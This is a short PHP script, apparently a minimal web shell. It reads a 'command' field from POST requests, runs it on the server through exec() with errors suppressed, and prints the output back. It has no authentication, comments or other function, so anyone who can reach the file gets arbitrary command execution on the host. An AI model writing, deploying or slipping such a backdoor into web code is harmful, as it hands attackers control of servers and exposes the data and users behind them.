<?php
function exTKL() {
	$in=$_POST['command'];
	if (!$in == '') {
		$out = '';
		if (function_exists('exec')) {
			@exec($in,$out);
			$out = @join("\n",$out);
		}
		echo $out;
	}
}

if (!$_POST['command'] == ''){
	exTKL();
}
?>